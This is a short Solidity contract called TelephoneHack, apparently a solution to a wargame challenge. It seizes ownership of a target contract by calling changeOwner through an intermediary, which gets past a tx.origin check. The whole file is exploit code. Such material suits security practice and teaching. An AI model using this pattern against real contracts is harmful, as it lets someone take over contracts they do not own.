pragma solidity ^0.5.0;

contract TelephoneHack {

    address contractAdd;
    
    constructor(address deployAdd) public {
        contractAdd = deployAdd;
    }
    
    function callTelephoneHac(address owner) public {
        bytes memory payload = abi.encodeWithSignature("changeOwner(address)", owner);
        (bool success, ) = address(contractAdd).call(payload);
        
        require(success);
    }
}